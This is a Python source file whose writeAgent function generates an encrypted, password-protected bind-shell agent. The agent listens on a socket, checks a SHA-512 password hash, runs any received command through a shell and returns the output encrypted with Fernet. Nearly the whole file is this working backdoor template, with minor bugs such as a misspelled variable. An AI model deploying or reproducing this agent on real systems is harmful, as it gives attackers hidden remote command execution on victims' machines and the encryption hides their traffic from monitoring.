
import sys


def writeAgent(output, rhost, rport, password):

    agent  = '''
import os
import socket
import base64
import hashlib
import threading
import subprocess
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend



class Crypto():
    """Simple class to perform encryption and decryption with Fernet. Initialize with crypto = Crypto('password')"""

    def __init__(self, password):
    
        self.password = password.encode()
        digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
        digest.update(self.password)

        self.key = base64.urlsafe_b64encode(digest.finalize())

        self.fernet = Fernet(self.key)


    def encrypt_file(self, infile, outfile):
        """Encrypt file"""

        try:

            with open(infile, 'rb') as fileStream:
                plainData = fileStream.read()

            with open(outfile, 'wb') as fileStream:

                encrypted = self.fernet.encrypt(plainData)
                fileStream.write(encrypted)
                
        except Exception as error:
            print(error)


    def encrypt_message(self, message):
        """Encrypt simple message which will be return a string and not bytes"""
        
        message = message.encode()
        encrypted = self.fernet.encrypt(message)

        return encrypted.decode()
        
    def decrypt_file(self, infile, outfile):
        """Encrypt file"""

        try:

            with open(infile, 'rb') as fileStream:
                cipherData = fileStream.read()

            with open(outfile, 'wb') as fileStream:

                decrypted = self.fernet.decrypt(cipherData)
                fileStream.write(decrypted)
                
        except Exception as error:
            print(error)

    
    def decrypt_message(self, message):
        """Decrypt simple message which will be return a string and not bytes"""

        message = message.encode()
        decrypted = self.fernet.decrypt(message)

        return decrypted.decode()

    def debug(self):
        """Function to print password and generated key"""
        
        print(self.password.decode())
        print(self.key.decode())





def passwordChallenge(channel, passwd):

    bufferSize = BUFFER_SIZE

    ciperPassword = hashlib.sha512(passwd.encode()).hexdigest()
    while True:
        rawHashPassword = channel.recv(bufferSize)
        if len(rawHashPassword) < bufferSize:
            break

    # Decode bytes to str
    hashPassword = rawHashPassword.decode()
    
    if hashPassword == ciperPassword:
        response = hashlib.sha512(ciperPassword.encode()).hexdigest()
        channel.sendall(response.encode())
        challenge = True
    
    elif hashPassword != ciperPassword:
        response = b' '
        channel.sendall(response)
        channel.close()
        challenge = False

    return challenge


def serverHandler(channel, password):

    crypto = Crypto(password)


    # Loop on socket.recv
    while True:
    
        try:
            # Define buffer size, can be increased
            bufferSize = BUFFER_SIZE
            
            # While loop to complete socket buffer in recv 
            while True:
                rawRequest = channel.recv(bufferSize)
                if len(rawRequest) < bufferSize:
                    break
            # Decode bytes to str
            clientRequest = rawRequest.decode()

            # If 'cd' command send
            if clientRequest.split(' ')[0] == 'cd':
                workingDir = clientRequest.split(' ')[1]
                if os.path.isdir(workingDir):
                    os.chdir(workingDir)
                    # Return empty output, to not block the remote shell
                    output = ' '
                else:
                    output = crypto.encrypt_message(f"{{workingDir}} doesn'nt exist")

                channel.sendall(output.encode())

            elif clientRequest == 'alive ?':
                response = crypto.encrypt_message("alive !")
                channel.sendall(reponse.encode())
            
            # Else execute shell command
            else:
                workingDir = os.getcwd()
                output = shellCommand(clientRequest, workingDir)
                output = crypto.encrypt_message(output)
                channel.sendall(output.encode())

        except KeyboardInterrupt:
            channel.close()
            exit()

        except Exception as error:
            print(f"[!] {{error}}")
            exit()
    




def shellCommand(command, cwd):

    # Easy command, with no output handler
    #output = subprocess.check_output(command, shell=True, stderr=STDOUT)

    # Complete shell command, with pipe to get STDOUT, STDERR
    shellCommand = subprocess.Popen(

        str(command),
        cwd=cwd,
        shell=True, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        stdin=subprocess.PIPE
    )
    
    # Get exit code
    exitCode = shellCommand.returncode
    # Parse STDOUT and STDERR
    STDOUT, STDERR = shellCommand.communicate()

    # If not STDOUT and STDERR, return STDERR in remote shell
    if not STDOUT and STDERR:
        shellOutput = STDERR
    # If STDOUT and not STDERR, return STDOUT in remote shell
    elif not STDERR and STDOUT:
        shellOutput = STDOUT
    # Else, return an empty str (in case of system command touch/rm/cat...)
    else:
        shellOutput = b' '

    return shellOutput.decode()

# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------

BUFFER_SIZE = 1024

bindPort = {}
bindAddress = '{}'
password = '{}'


serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

serverSocket.bind((bindAddress, bindPort))
serverSocket.listen(5)

print(f"[?] Listening on {{bindAddress}}:{{bindPort}}")

while True:

    try:

        channel, cliAddress = serverSocket.accept()
        print(f"[+] Received Connection from {{cliAddress[0]}}")
        challenge = passwordChallenge(channel, password)
        if challenge is True:
            serverHandler(channel, password)
        elif challenge is False:
            channel.close()


    except KeyboardInterrupt:
        serverSocket.close()
        exit()
        
        
    except Exception as error:
        print(f"[!] {{error}}")
        serverSocket.close()
        exit()

    '''.format(
        rport,
        rhost,
        password
    )


    try:

        with open(output, 'w') as fileStream:
            fileStream.write(agent)

        print(f"[+] Agent successfully write to {output}")

    except Exception as error:
        print(f"[!] An error occured when trying to write agent : ")
        print(error)

